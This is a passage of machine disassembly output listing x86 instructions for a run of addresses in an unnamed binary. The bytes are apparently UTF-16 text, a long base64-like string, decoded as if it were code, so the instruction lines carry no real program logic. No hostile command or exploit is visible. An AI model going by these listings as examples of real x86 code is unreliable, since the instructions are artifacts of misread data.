  40be46:	00 75 00             	add    %dh,0x0(%ebp)
  40be49:	4f                   	dec    %edi
  40be4a:	00 32                	add    %dh,(%edx)
  40be4c:	00 2f                	add    %ch,(%edi)
  40be4e:	00 67 00             	add    %ah,0x0(%edi)
  40be51:	32 00                	xor    (%eax),%al
  40be53:	72 00                	jb     0x40be55
  40be55:	63 00                	arpl   %eax,(%eax)
  40be57:	65 00 38             	add    %bh,%gs:(%eax)
  40be5a:	00 50 00             	add    %dl,0x0(%eax)
  40be5d:	43                   	inc    %ebx
  40be5e:	00 6a 00             	add    %ch,0x0(%edx)
  40be61:	68 00 72 00 41       	push   $0x41007200
  40be66:	00 45 00             	add    %al,0x0(%ebp)
  40be69:	49                   	dec    %ecx
  40be6a:	00 65 00             	add    %ah,0x0(%ebp)
  40be6d:	43                   	inc    %ebx
  40be6e:	00 5a 00             	add    %bl,0x0(%edx)
  40be71:	30 00                	xor    %al,(%eax)
  40be73:	49                   	dec    %ecx
  40be74:	00 65 00             	add    %ah,0x0(%ebp)
  40be77:	59                   	pop    %ecx
  40be78:	00 6f 00             	add    %ch,0x0(%edi)
  40be7b:	38 00                	cmp    %al,(%eax)
  40be7d:	79 00                	jns    0x40be7f
  40be7f:	76 00                	jbe    0x40be81
  40be81:	51                   	push   %ecx
  40be82:	00 35 00 48 00 45    	add    %dh,0x45004800
  40be88:	00 55 00             	add    %dl,0x0(%ebp)
  40be8b:	37                   	aaa
  40be8c:	00 63 00             	add    %ah,0x0(%ebx)
  40be8f:	43                   	inc    %ebx
  40be90:	00 76 00             	add    %dh,0x0(%esi)
  40be93:	4e                   	dec    %esi
  40be94:	00 66 00             	add    %ah,0x0(%esi)
  40be97:	73 00                	jae    0x40be99
  40be99:	57                   	push   %edi
  40be9a:	00 69 00             	add    %ch,0x0(%ecx)
  40be9d:	56                   	push   %esi
  40be9e:	00 6c 00 76          	add    %ch,0x76(%eax,%eax,1)
  40bea2:	00 4e 00             	add    %cl,0x0(%esi)
  40bea5:	38 00                	cmp    %al,(%eax)
  40bea7:	4d                   	dec    %ebp
  40bea8:	00 52 00             	add    %dl,0x0(%edx)
  40beab:	75 00                	jne    0x40bead
  40bead:	32 00                	xor    (%eax),%al
  40beaf:	41                   	inc    %ecx
  40beb0:	00 65 00             	add    %ah,0x0(%ebp)
  40beb3:	6b 00 53             	imul   $0x53,(%eax),%eax
  40beb6:	00 30                	add    %dh,(%eax)
  40beb8:	00 74 00 35          	add    %dh,0x35(%eax,%eax,1)
  40bebc:	00 69 00             	add    %ch,0x0(%ecx)
  40bebf:	71 00                	jno    0x40bec1
  40bec1:	4f                   	dec    %edi
  40bec2:	00 67 00             	add    %ah,0x0(%edi)
  40bec5:	6c                   	insb   (%dx),%es:(%edi)
  40bec6:	00 32                	add    %dh,(%edx)
  40bec8:	00 4e 00             	add    %cl,0x0(%esi)
  40becb:	6e                   	outsb  %ds:(%esi),(%dx)
  40becc:	00 52 00             	add    %dl,0x0(%edx)
  40becf:	67 00 48 00          	add    %cl,0x0(%bx,%si)
  40bed3:	32 00                	xor    (%eax),%al
  40bed5:	6f                   	outsl  %ds:(%esi),(%dx)
  40bed6:	00 64 00 71          	add    %ah,0x71(%eax,%eax,1)
  40beda:	00 69 00             	add    %ch,0x0(%ecx)
  40bedd:	74 00                	je     0x40bedf
  40bedf:	62 00                	bound  %eax,(%eax)
  40bee1:	64 00 67 00          	add    %ah,%fs:0x0(%edi)
  40bee5:	4e                   	dec    %esi
  40bee6:	00 70 00             	add    %dh,0x0(%eax)
  40bee9:	45                   	inc    %ebp
  40beea:	00 61 00             	add    %ah,0x0(%ecx)
  40beed:	75 00                	jne    0x40beef
  40beef:	58                   	pop    %eax
  40bef0:	00 74 00 6e          	add    %dh,0x6e(%eax,%eax,1)
  40bef4:	00 45 00             	add    %al,0x0(%ebp)
  40bef7:	72 00                	jb     0x40bef9
  40bef9:	32 00                	xor    (%eax),%al
  40befb:	78 00                	js     0x40befd
  40befd:	4c                   	dec    %esp
  40befe:	00 49 00             	add    %cl,0x0(%ecx)
  40bf01:	32 00                	xor    (%eax),%al
  40bf03:	44                   	inc    %esp
  40bf04:	00 49 00             	add    %cl,0x0(%ecx)
  40bf07:	35 00 4a 00 2f       	xor    $0x2f004a00,%eax
  40bf0c:	00 74 00 63          	add    %dh,0x63(%eax,%eax,1)
  40bf10:	00 4e 00             	add    %cl,0x0(%esi)
  40bf13:	4c                   	dec    %esp
  40bf14:	00 4c 00 2b          	add    %cl,0x2b(%eax,%eax,1)
  40bf18:	00 4d 00             	add    %cl,0x0(%ebp)
  40bf1b:	73 00                	jae    0x40bf1d
  40bf1d:	45                   	inc    %ebp
  40bf1e:	00 32                	add    %dh,(%edx)
  40bf20:	00 4b 00             	add    %cl,0x0(%ebx)
  40bf23:	73 00                	jae    0x40bf25
  40bf25:	77 00                	ja     0x40bf27
  40bf27:	59                   	pop    %ecx
  40bf28:	00 72 00             	add    %dh,0x0(%edx)
  40bf2b:	65 00 77 00          	add    %dh,%gs:0x0(%edi)
  40bf2f:	6f                   	outsl  %ds:(%esi),(%dx)
  40bf30:	00 6b 00             	add    %ch,0x0(%ebx)
  40bf33:	6f                   	outsl  %ds:(%esi),(%dx)
  40bf34:	00 6e 00             	add    %ch,0x0(%esi)
  40bf37:	50                   	push   %eax
  40bf38:	00 35 00 37 00 52    	add    %dh,0x52003700
  40bf3e:	00 2f                	add    %ch,(%edi)
  40bf40:	00 39                	add    %bh,(%ecx)
  40bf42:	00 54 00 71          	add    %dl,0x71(%eax,%eax,1)
  40bf46:	00 71 00             	add    %dh,0x0(%ecx)
  40bf49:	6b 00 73             	imul   $0x73,(%eax),%eax
  40bf4c:	00 73 00             	add    %dh,0x0(%ebx)
  40bf4f:	5a                   	pop    %edx
  40bf50:	00 6d 00             	add    %ch,0x0(%ebp)
  40bf53:	4e                   	dec    %esi
  40bf54:	00 34 00             	add    %dh,(%eax,%eax,1)
  40bf57:	6d                   	insl   (%dx),%es:(%edi)
  40bf58:	00 4e 00             	add    %cl,0x0(%esi)
  40bf5b:	65 00 31             	add    %dh,%gs:(%ecx)
  40bf5e:	00 4d 00             	add    %cl,0x0(%ebp)
  40bf61:	6a 00                	push   $0x0
  40bf63:	50                   	push   %eax
  40bf64:	00 4a 00             	add    %cl,0x0(%edx)
  40bf67:	36 00 4b 00          	add    %cl,%ss:0x0(%ebx)
  40bf6b:	4e                   	dec    %esi
  40bf6c:	00 2b                	add    %ch,(%ebx)
  40bf6e:	00 6d 00             	add    %ch,0x0(%ebp)
  40bf71:	4e                   	dec    %esi
  40bf72:	00 6a 00             	add    %ch,0x0(%edx)
  40bf75:	68 00 47 00 5a       	push   $0x5a004700
  40bf7a:	00 49 00             	add    %cl,0x0(%ecx)
  40bf7d:	37                   	aaa
  40bf7e:	00 44 00 30          	add    %al,0x30(%eax,%eax,1)
  40bf82:	00 79 00             	add    %bh,0x0(%ecx)
  40bf85:	33 00                	xor    (%eax),%eax
  40bf87:	50                   	push   %eax
  40bf88:	00 61 00             	add    %ah,0x0(%ecx)
  40bf8b:	72 00                	jb     0x40bf8d
  40bf8d:	57                   	push   %edi
  40bf8e:	00 76 00             	add    %dh,0x0(%esi)
  40bf91:	4c                   	dec    %esp
  40bf92:	00 36                	add    %dh,(%esi)
  40bf94:	00 33                	add    %dh,(%ebx)
  40bf96:	00 4d 00             	add    %cl,0x0(%ebp)
  40bf99:	5a                   	pop    %edx
  40bf9a:	00 42 00             	add    %al,0x0(%edx)
  40bf9d:	38 00                	cmp    %al,(%eax)
  40bf9f:	4a                   	dec    %edx
  40bfa0:	00 53 00             	add    %dl,0x0(%ebx)
  40bfa3:	74 00                	je     0x40bfa5
  40bfa5:	43                   	inc    %ebx
  40bfa6:	00 32                	add    %dh,(%edx)
  40bfa8:	00 66 00             	add    %ah,0x0(%esi)
  40bfab:	4c                   	dec    %esp
  40bfac:	00 48 00             	add    %cl,0x0(%eax)
  40bfaf:	35 00 46 00 61       	xor    $0x61004600,%eax
  40bfb4:	00 70 00             	add    %dh,0x0(%eax)
  40bfb7:	50                   	push   %eax
  40bfb8:	00 6a 00             	add    %ch,0x0(%edx)
  40bfbb:	6d                   	insl   (%dx),%es:(%edi)
  40bfbc:	00 57 00             	add    %dl,0x0(%edi)
  40bfbf:	2b 00                	sub    (%eax),%eax
  40bfc1:	73 00                	jae    0x40bfc3
  40bfc3:	48                   	dec    %eax
  40bfc4:	00 44 00 75          	add    %al,0x75(%eax,%eax,1)
  40bfc8:	00 32                	add    %dh,(%edx)
  40bfca:	00 76 00             	add    %dh,0x0(%esi)
  40bfcd:	30 00                	xor    %al,(%eax)
  40bfcf:	63 00                	arpl   %eax,(%eax)
  40bfd1:	4e                   	dec    %esi
  40bfd2:	00 39                	add    %bh,(%ecx)
  40bfd4:	00 78 00             	add    %bh,0x0(%eax)
  40bfd7:	62 00                	bound  %eax,(%eax)
  40bfd9:	4e                   	dec    %esi
  40bfda:	00 70 00             	add    %dh,0x0(%eax)
  40bfdd:	4f                   	dec    %edi
  40bfde:	00 76 00             	add    %dh,0x0(%esi)
  40bfe1:	69 00 70 00 45 00    	imul   $0x450070,(%eax),%eax
  40bfe7:	31 00                	xor    %eax,(%eax)
  40bfe9:	75 00                	jne    0x40bfeb
  40bfeb:	74 00                	je     0x40bfed
  40bfed:	55                   	push   %ebp
  40bfee:	00 49 00             	add    %cl,0x0(%ecx)
  40bff1:	57                   	push   %edi
  40bff2:	00 49 00             	add    %cl,0x0(%ecx)
  40bff5:	55                   	push   %ebp
  40bff6:	00 6e 00             	add    %ch,0x0(%esi)
  40bff9:	77 00                	ja     0x40bffb
  40bffb:	59                   	pop    %ecx
  40bffc:	00 6a 00             	add    %ch,0x0(%edx)
  40bfff:	6e                   	outsb  %ds:(%esi),(%dx)
  40c000:	00 69 00             	add    %ch,0x0(%ecx)
  40c003:	57                   	push   %edi
  40c004:	00 6a 00             	add    %ch,0x0(%edx)
  40c007:	68 00 50 00 55       	push   $0x55005000
  40c00c:	00 50 00             	add    %dl,0x0(%eax)
  40c00f:	47                   	inc    %edi
  40c010:	00 55 00             	add    %dl,0x0(%ebp)
  40c013:	6f                   	outsl  %ds:(%esi),(%dx)
  40c014:	00 6c 00 32          	add    %ch,0x32(%eax,%eax,1)
  40c018:	00 48 00             	add    %cl,0x0(%eax)
  40c01b:	73 00                	jae    0x40c01d
  40c01d:	30 00                	xor    %al,(%eax)
  40c01f:	46                   	inc    %esi
  40c020:	00 71 00             	add    %dh,0x0(%ecx)
  40c023:	37                   	aaa
  40c024:	00 4d 00             	add    %cl,0x0(%ebp)
  40c027:	35 00 50 00 30       	xor    $0x30005000,%eax
  40c02c:	00 45 00             	add    %al,0x0(%ebp)
  40c02f:	48                   	dec    %eax
  40c030:	00 38                	add    %bh,(%eax)
  40c032:	00 70 00             	add    %dh,0x0(%eax)
  40c035:	77 00                	ja     0x40c037
  40c037:	57                   	push   %edi
  40c038:	00 76 00             	add    %dh,0x0(%esi)
  40c03b:	74 00                	je     0x40c03d
  40c03d:	73 00                	jae    0x40c03f
  40c03f:	61                   	popa
  40c040:	00 66 00             	add    %ah,0x0(%esi)
  40c043:	51                   	push   %ecx
  40c044:	00 69 00             	add    %ch,0x0(%ecx)
  40c047:	35 00 4a 00 6d       	xor    $0x6d004a00,%eax
  40c04c:	00 6a 00             	add    %ch,0x0(%edx)
  40c04f:	62 00                	bound  %eax,(%eax)
  40c051:	62 00                	bound  %eax,(%eax)
  40c053:	58                   	pop    %eax
  40c054:	00 6c 00 61          	add    %ch,0x61(%eax,%eax,1)
  40c058:	00 32                	add    %dh,(%edx)
  40c05a:	00 44 00 4e          	add    %al,0x4e(%eax,%eax,1)
  40c05e:	00 51 00             	add    %dl,0x0(%ecx)
  40c061:	67 00 43 00          	add    %al,0x0(%bp,%di)
  40c065:	49                   	dec    %ecx
  40c066:	00 37                	add    %dh,(%edi)
  40c068:	00 73 00             	add    %dh,0x0(%ebx)
  40c06b:	78 00                	js     0x40c06d
  40c06d:	39 00                	cmp    %eax,(%eax)
  40c06f:	70 00                	jo     0x40c071
  40c071:	74 00                	je     0x40c073
  40c073:	51                   	push   %ecx
  40c074:	00 37                	add    %dh,(%edi)
  40c076:	00 6a 00             	add    %ch,0x0(%edx)
  40c079:	63 00                	arpl   %eax,(%eax)
  40c07b:	6c                   	insb   (%dx),%es:(%edi)
  40c07c:	00 54 00 68          	add    %dl,0x68(%eax,%eax,1)
  40c080:	00 77 00             	add    %dh,0x0(%edi)
  40c083:	79 00                	jns    0x40c085
  40c085:	50                   	push   %eax
  40c086:	00 6c 00 2b          	add    %ch,0x2b(%eax,%eax,1)
  40c08a:	00 30                	add    %dh,(%eax)
  40c08c:	00 4a 00             	add    %cl,0x0(%edx)
  40c08f:	76 00                	jbe    0x40c091
  40c091:	46                   	inc    %esi
  40c092:	00 75 00             	add    %dh,0x0(%ebp)
  40c095:	36 00 2b             	add    %ch,%ss:(%ebx)
  40c098:	00 53 00             	add    %dl,0x0(%ebx)
  40c09b:	6f                   	outsl  %ds:(%esi),(%dx)
  40c09c:	00 51 00             	add    %dl,0x0(%ecx)
  40c09f:	37                   	aaa
  40c0a0:	00 6d 00             	add    %ch,0x0(%ebp)
  40c0a3:	37                   	aaa
  40c0a4:	00 46 00             	add    %al,0x0(%esi)
  40c0a7:	42                   	inc    %edx
  40c0a8:	00 59 00             	add    %bl,0x0(%ecx)
  40c0ab:	32 00                	xor    (%eax),%al
  40c0ad:	4c                   	dec    %esp
  40c0ae:	00 6f 00             	add    %ch,0x0(%edi)
  40c0b1:	6f                   	outsl  %ds:(%esi),(%dx)
  40c0b2:	00 2f                	add    %ch,(%edi)
  40c0b4:	00 36                	add    %dh,(%esi)
  40c0b6:	00 36                	add    %dh,(%esi)
  40c0b8:	00 36                	add    %dh,(%esi)
  40c0ba:	00 46 00             	add    %al,0x0(%esi)
  40c0bd:	64 00 4f 00          	add    %cl,%fs:0x0(%edi)
  40c0c1:	6d                   	insl   (%dx),%es:(%edi)
  40c0c2:	00 64 00 68          	add    %ah,0x68(%eax,%eax,1)
  40c0c6:	00 41 00             	add    %al,0x0(%ecx)
  40c0c9:	37                   	aaa
  40c0ca:	00 38                	add    %bh,(%eax)
  40c0cc:	00 56 00             	add    %dl,0x0(%esi)
  40c0cf:	67 00 6e 00          	add    %ch,0x0(%bp)
  40c0d3:	4c                   	dec    %esp
  40c0d4:	00 67 00             	add    %ah,0x0(%edi)
  40c0d7:	52                   	push   %edx
  40c0d8:	00 32                	add    %dh,(%edx)
  40c0da:	00 79 00             	add    %bh,0x0(%ecx)
  40c0dd:	46                   	inc    %esi
  40c0de:	00 53 00             	add    %dl,0x0(%ebx)
  40c0e1:	4e                   	dec    %esi
  40c0e2:	00 32                	add    %dh,(%edx)
  40c0e4:	00 64 00 42          	add    %ah,0x42(%eax,%eax,1)
  40c0e8:	00 73 00             	add    %dh,0x0(%ebx)
  40c0eb:	62 00                	bound  %eax,(%eax)
  40c0ed:	67 00 5a 00          	add    %bl,0x0(%bp,%si)
  40c0f1:	69 00 46 00 69 00    	imul   $0x690046,(%eax),%eax
  40c0f7:	65 00 6d 00          	add    %ch,%gs:0x0(%ebp)
  40c0fb:	49                   	dec    %ecx
  40c0fc:	00 78 00             	add    %bh,0x0(%eax)
  40c0ff:	37                   	aaa
  40c100:	00 62 00             	add    %ah,0x0(%edx)
  40c103:	77 00                	ja     0x40c105
  40c105:	6f                   	outsl  %ds:(%esi),(%dx)
  40c106:	00 56 00             	add    %dl,0x0(%esi)
  40c109:	63 00                	arpl   %eax,(%eax)
  40c10b:	44                   	inc    %esp
  40c10c:	00 70 00             	add    %dh,0x0(%eax)
  40c10f:	69 00 45 00 46 00    	imul   $0x460045,(%eax),%eax
  40c115:	37                   	aaa
  40c116:	00 52 00             	add    %dl,0x0(%edx)
  40c119:	36 00 4a 00          	add    %cl,%ss:0x0(%edx)
  40c11d:	51                   	push   %ecx
  40c11e:	00 47 00             	add    %al,0x0(%edi)
  40c121:	59                   	pop    %ecx
  40c122:	00 34 00             	add    %dh,(%eax,%eax,1)
  40c125:	51                   	push   %ecx
  40c126:	00 36                	add    %dh,(%esi)
  40c128:	00 32                	add    %dh,(%edx)
  40c12a:	00 74 00 32          	add    %dh,0x32(%eax,%eax,1)
  40c12e:	00 51 00             	add    %dl,0x0(%ecx)
  40c131:	67 00 2f             	add    %ch,(%bx)
  40c134:	00 66 00             	add    %ah,0x0(%esi)
  40c137:	49                   	dec    %ecx
  40c138:	00 6b 00             	add    %ch,0x0(%ebx)
  40c13b:	50                   	push   %eax
  40c13c:	00 51 00             	add    %dl,0x0(%ecx)
  40c13f:	70 00                	jo     0x40c141
  40c141:	2b 00                	sub    (%eax),%eax
  40c143:	2b 00                	sub    (%eax),%eax
  40c145:	53                   	push   %ebx
  40c146:	00 34 00             	add    %dh,(%eax,%eax,1)
  40c149:	41                   	inc    %ecx
  40c14a:	00 67 00             	add    %ah,0x0(%edi)
  40c14d:	44                   	inc    %esp
  40c14e:	00 72 00             	add    %dh,0x0(%edx)
  40c151:	49                   	dec    %ecx
  40c152:	00 46 00             	add    %al,0x0(%esi)
  40c155:	63 00                	arpl   %eax,(%eax)
  40c157:	30 00                	xor    %al,(%eax)
  40c159:	2f                   	das
  40c15a:	00 63 00             	add    %ah,0x0(%ebx)
  40c15d:	6f                   	outsl  %ds:(%esi),(%dx)
  40c15e:	00 47 00             	add    %al,0x0(%edi)
  40c161:	78 00                	js     0x40c163
  40c163:	52                   	push   %edx
  40c164:	00 53 00             	add    %dl,0x0(%ebx)
  40c167:	49                   	dec    %ecx
  40c168:	00 4c 00 52          	add    %cl,0x52(%eax,%eax,1)
  40c16c:	00 4b 00             	add    %cl,0x0(%ebx)
  40c16f:	50                   	push   %eax
  40c170:	00 31                	add    %dh,(%ecx)
  40c172:	00 74 00 73          	add    %dh,0x73(%eax,%eax,1)
  40c176:	00 6e 00             	add    %ch,0x0(%esi)
  40c179:	31 00                	xor    %eax,(%eax)
  40c17b:	74 00                	je     0x40c17d
  40c17d:	66 00 6e 00          	data16 add %ch,0x0(%esi)
  40c181:	31 00                	xor    %eax,(%eax)
  40c183:	44                   	inc    %esp
  40c184:	00 36                	add    %dh,(%esi)
  40c186:	00 53 00             	add    %dl,0x0(%ebx)
  40c189:	58                   	pop    %eax
  40c18a:	00 36                	add    %dh,(%esi)
  40c18c:	00 4a 00             	add    %cl,0x0(%edx)
  40c18f:	67 00 69 00          	add    %ch,0x0(%bx,%di)
  40c193:	58                   	pop    %eax
  40c194:	00 52 00             	add    %dl,0x0(%edx)
  40c197:	36 00 64 00 73       	add    %ah,%ss:0x73(%eax,%eax,1)
  40c19c:	00 70 00             	add    %dh,0x0(%eax)
  40c19f:	61                   	popa
  40c1a0:	00 65 00             	add    %ah,0x0(%ebp)
  40c1a3:	6a 00                	push   $0x0
  40c1a5:	41                   	inc    %ecx
  40c1a6:	00 65 00             	add    %ah,0x0(%ebp)
  40c1a9:	34 00                	xor    $0x0,%al
  40c1ab:	62 00                	bound  %eax,(%eax)
  40c1ad:	6a 00                	push   $0x0
  40c1af:	4e                   	dec    %esi
  40c1b0:	00 79 00             	add    %bh,0x0(%ecx)
  40c1b3:	72 00                	jb     0x40c1b5
  40c1b5:	73 00                	jae    0x40c1b7
  40c1b7:	56                   	push   %esi
  40c1b8:	00 66 00             	add    %ah,0x0(%esi)
  40c1bb:	52                   	push   %edx
  40c1bc:	00 36                	add    %dh,(%esi)
  40c1be:	00 54 00 69          	add    %dl,0x69(%eax,%eax,1)
  40c1c2:	00 31                	add    %dh,(%ecx)
  40c1c4:	00 6e 00             	add    %ch,0x0(%esi)
  40c1c7:	77 00                	ja     0x40c1c9
  40c1c9:	6a 00                	push   $0x0
  40c1cb:	45                   	inc    %ebp
  40c1cc:	00 73 00             	add    %dh,0x0(%ebx)
  40c1cf:	64 00 78 00          	add    %bh,%fs:0x0(%eax)
  40c1d3:	30 00                	xor    %al,(%eax)
  40c1d5:	73 00                	jae    0x40c1d7
  40c1d7:	35 00 38 00 47       	xor    $0x47003800,%eax
  40c1dc:	00 34 00             	add    %dh,(%eax,%eax,1)
  40c1df:	4e                   	dec    %esi
  40c1e0:	00 76 00             	add    %dh,0x0(%esi)
  40c1e3:	6c                   	insb   (%dx),%es:(%edi)
  40c1e4:	00 38                	add    %bh,(%eax)
  40c1e6:	00 47 00             	add    %al,0x0(%edi)
  40c1e9:	75 00                	jne    0x40c1eb
  40c1eb:	5a                   	pop    %edx
  40c1ec:	00 6f 00             	add    %ch,0x0(%edi)
  40c1ef:	6b 00 65             	imul   $0x65,(%eax),%eax
  40c1f2:	00 56 00             	add    %dl,0x0(%esi)
  40c1f5:	68 00 5a 00 39       	push   $0x39005a00
  40c1fa:	00 58 00             	add    %bl,0x0(%eax)
  40c1fd:	6d                   	insl   (%dx),%es:(%edi)
  40c1fe:	00 59 00             	add    %bl,0x0(%ecx)
  40c201:	51                   	push   %ecx
  40c202:	00 53 00             	add    %dl,0x0(%ebx)
  40c205:	73 00                	jae    0x40c207
  40c207:	6d                   	insl   (%dx),%es:(%edi)
  40c208:	00 7a 00             	add    %bh,0x0(%edx)
  40c20b:	70 00                	jo     0x40c20d
  40c20d:	54                   	push   %esp
  40c20e:	00 53 00             	add    %dl,0x0(%ebx)
  40c211:	64 00 6a 00          	add    %ch,%fs:0x0(%edx)
  40c215:	45                   	inc    %ebp
  40c216:	00 4f 00             	add    %cl,0x0(%edi)
  40c219:	48                   	dec    %eax
  40c21a:	00 4a 00             	add    %cl,0x0(%edx)
  40c21d:	33 00                	xor    (%eax),%eax
  40c21f:	46                   	inc    %esi
  40c220:	00 75 00             	add    %dh,0x0(%ebp)
  40c223:	47                   	inc    %edi
  40c224:	00 31                	add    %dh,(%ecx)
  40c226:	00 55 00             	add    %dl,0x0(%ebp)
  40c229:	47                   	inc    %edi
  40c22a:	00 65 00             	add    %ah,0x0(%ebp)
  40c22d:	62 00                	bound  %eax,(%eax)
  40c22f:	38 00                	cmp    %al,(%eax)
  40c231:	4e                   	dec    %esi
  40c232:	00 6f 00             	add    %ch,0x0(%edi)
  40c235:	61                   	popa
  40c236:	00 45 00             	add    %al,0x0(%ebp)
  40c239:	66 00 74 00 4e       	data16 add %dh,0x4e(%eax,%eax,1)
  40c23e:	00 61 00             	add    %ah,0x0(%ecx)
  40c241:	62 00                	bound  %eax,(%eax)
  40c243:	6b 00 4b             	imul   $0x4b,(%eax),%eax
  40c246:	00 39                	add    %bh,(%ecx)
  40c248:	00 6a 00             	add    %ch,0x0(%edx)
  40c24b:	33 00                	xor    (%eax),%eax
  40c24d:	42                   	inc    %edx
  40c24e:	00 4b 00             	add    %cl,0x0(%ebx)
  40c251:	56                   	push   %esi
  40c252:	00 63 00             	add    %ah,0x0(%ebx)
  40c255:	65 00 74 00 45       	add    %dh,%gs:0x45(%eax,%eax,1)
  40c25a:	00 6b 00             	add    %ch,0x0(%ebx)
  40c25d:	52                   	push   %edx
  40c25e:	00 6b 00             	add    %ch,0x0(%ebx)
  40c261:	69 00 4e 00 6c 00    	imul   $0x6c004e,(%eax),%eax
  40c267:	67 00 73 00          	add    %dh,0x0(%bp,%di)
  40c26b:	31 00                	xor    %eax,(%eax)
  40c26d:	46                   	inc    %esi
  40c26e:	00 51 00             	add    %dl,0x0(%ecx)
  40c271:	64 00 52 00          	add    %dl,%fs:0x0(%edx)
  40c275:	2f                   	das
  40c276:	00 6c 00 71          	add    %ch,0x71(%eax,%eax,1)
  40c27a:	00 35 00 38 00 4f    	add    %dh,0x4f003800
  40c280:	00 55 00             	add    %dl,0x0(%ebp)
  40c283:	74 00                	je     0x40c285
  40c285:	75 00                	jne    0x40c287
  40c287:	37                   	aaa
  40c288:	00 73 00             	add    %dh,0x0(%ebx)
  40c28b:	49                   	dec    %ecx
  40c28c:	00 59 00             	add    %bl,0x0(%ecx)
  40c28f:	71 00                	jno    0x40c291
  40c291:	39 00                	cmp    %eax,(%eax)
  40c293:	49                   	dec    %ecx
  40c294:	00 43 00             	add    %al,0x0(%ebx)
  40c297:	54                   	push   %esp
  40c298:	00 4b 00             	add    %cl,0x0(%ebx)
  40c29b:	74 00                	je     0x40c29d
  40c29d:	6c                   	insb   (%dx),%es:(%edi)
  40c29e:	00 6f 00             	add    %ch,0x0(%edi)
  40c2a1:	57                   	push   %edi
  40c2a2:	00 67 00             	add    %ah,0x0(%edi)
  40c2a5:	6e                   	outsb  %ds:(%esi),(%dx)
  40c2a6:	00 73 00             	add    %dh,0x0(%ebx)
  40c2a9:	64 00 2b             	add    %ch,%fs:(%ebx)
  40c2ac:	00 6c 00 4f          	add    %ch,0x4f(%eax,%eax,1)
  40c2b0:	00 50 00             	add    %dl,0x0(%eax)
  40c2b3:	55                   	push   %ebp
  40c2b4:	00 5a 00             	add    %bl,0x0(%edx)
  40c2b7:	59                   	pop    %ecx
  40c2b8:	00 37                	add    %dh,(%edi)
  40c2ba:	00 68 00             	add    %ch,0x0(%eax)
  40c2bd:	4a                   	dec    %edx
  40c2be:	00 46 00             	add    %al,0x0(%esi)
  40c2c1:	52                   	push   %edx
  40c2c2:	00 43 00             	add    %al,0x0(%ebx)
  40c2c5:	37                   	aaa
  40c2c6:	00 6c 00 62          	add    %ch,0x62(%eax,%eax,1)
  40c2ca:	00 4e 00             	add    %cl,0x0(%esi)
  40c2cd:	72 00                	jb     0x40c2cf
  40c2cf:	53                   	push   %ebx
  40c2d0:	00 4a 00             	add    %cl,0x0(%edx)
  40c2d3:	6a 00                	push   $0x0
  40c2d5:	62 00                	bound  %eax,(%eax)
  40c2d7:	56                   	push   %esi
  40c2d8:	00 6f 00             	add    %ch,0x0(%edi)
  40c2db:	77 00                	ja     0x40c2dd
  40c2dd:	53                   	push   %ebx
  40c2de:	00 58 00             	add    %bl,0x0(%eax)
  40c2e1:	69 00 45 00 51 00    	imul   $0x510045,(%eax),%eax
  40c2e7:	55                   	push   %ebp
  40c2e8:	00 45 00             	add    %al,0x0(%ebp)
  40c2eb:	6f                   	outsl  %ds:(%esi),(%dx)
  40c2ec:	00 35 00 6b 00 37    	add    %dh,0x37006b00
  40c2f2:	00 56 00             	add    %dl,0x0(%esi)
  40c2f5:	53                   	push   %ebx
  40c2f6:	00 68 00             	add    %ch,0x0(%eax)
  40c2f9:	57                   	push   %edi
  40c2fa:	00 32                	add    %dh,(%edx)
  40c2fc:	00 58 00             	add    %bl,0x0(%eax)
  40c2ff:	74 00                	je     0x40c301
  40c301:	75 00                	jne    0x40c303
  40c303:	55                   	push   %ebp
  40c304:	00 47 00             	add    %al,0x0(%edi)
  40c307:	65 00 67 00          	add    %ah,%gs:0x0(%edi)
  40c30b:	73 00                	jae    0x40c30d
  40c30d:	44                   	inc    %esp
  40c30e:	00 4a 00             	add    %cl,0x0(%edx)
  40c311:	34 00                	xor    $0x0,%al
  40c313:	73 00                	jae    0x40c315
  40c315:	31 00                	xor    %eax,(%eax)
  40c317:	47                   	inc    %edi
  40c318:	00 6c 00 59          	add    %ch,0x59(%eax,%eax,1)
  40c31c:	00 79 00             	add    %bh,0x0(%ecx)
  40c31f:	4b                   	dec    %ebx
  40c320:	00 38                	add    %bh,(%eax)
  40c322:	00 4e 00             	add    %cl,0x0(%esi)
  40c325:	34 00                	xor    $0x0,%al
  40c327:	62 00                	bound  %eax,(%eax)
  40c329:	62 00                	bound  %eax,(%eax)
  40c32b:	7a 00                	jp     0x40c32d
  40c32d:	79 00                	jns    0x40c32f
  40c32f:	31 00                	xor    %eax,(%eax)
  40c331:	77 00                	ja     0x40c333
  40c333:	31 00                	xor    %eax,(%eax)
  40c335:	6d                   	insl   (%dx),%es:(%edi)
  40c336:	00 51 00             	add    %dl,0x0(%ecx)
  40c339:	34 00                	xor    $0x0,%al
  40c33b:	63 00                	arpl   %eax,(%eax)
  40c33d:	6a 00                	push   $0x0
  40c33f:	57                   	push   %edi
  40c340:	00 58 00             	add    %bl,0x0(%eax)
  40c343:	35 00 54 00 53       	xor    $0x53005400,%eax
  40c348:	00 64 00 41          	add    %ah,0x41(%eax,%eax,1)
  40c34c:	00 66 00             	add    %ah,0x0(%esi)
  40c34f:	2f                   	das
  40c350:	00 42 00             	add    %al,0x0(%edx)
  40c353:	7a 00                	jp     0x40c355
  40c355:	6e                   	outsb  %ds:(%esi),(%dx)
  40c356:	00 4e 00             	add    %cl,0x0(%esi)
  40c359:	30 00                	xor    %al,(%eax)
  40c35b:	75 00                	jne    0x40c35d
  40c35d:	46                   	inc    %esi
  40c35e:	00 66 00             	add    %ah,0x0(%esi)
  40c361:	33 00                	xor    (%eax),%eax
  40c363:	43                   	inc    %ebx
  40c364:	00 53 00             	add    %dl,0x0(%ebx)
  40c367:	77 00                	ja     0x40c369
  40c369:	2f                   	das
  40c36a:	00 63 00             	add    %ah,0x0(%ebx)
  40c36d:	2f                   	das
  40c36e:	00 6f 00             	add    %ch,0x0(%edi)
  40c371:	30 00                	xor    %al,(%eax)
  40c373:	31 00                	xor    %eax,(%eax)
  40c375:	42                   	inc    %edx
  40c376:	00 41 00             	add    %al,0x0(%ecx)
  40c379:	73 00                	jae    0x40c37b
  40c37b:	4f                   	dec    %edi
  40c37c:	00 57 00             	add    %dl,0x0(%edi)
  40c37f:	58                   	pop    %eax
  40c380:	00 41 00             	add    %al,0x0(%ecx)
  40c383:	6c                   	insb   (%dx),%es:(%edi)
  40c384:	00 63 00             	add    %ah,0x0(%ebx)
  40c387:	63 00                	arpl   %eax,(%eax)
  40c389:	66 00 62 00          	data16 add %ah,0x0(%edx)
  40c38d:	75 00                	jne    0x40c38f
  40c38f:	66 00 34 00          	data16 add %dh,(%eax,%eax,1)
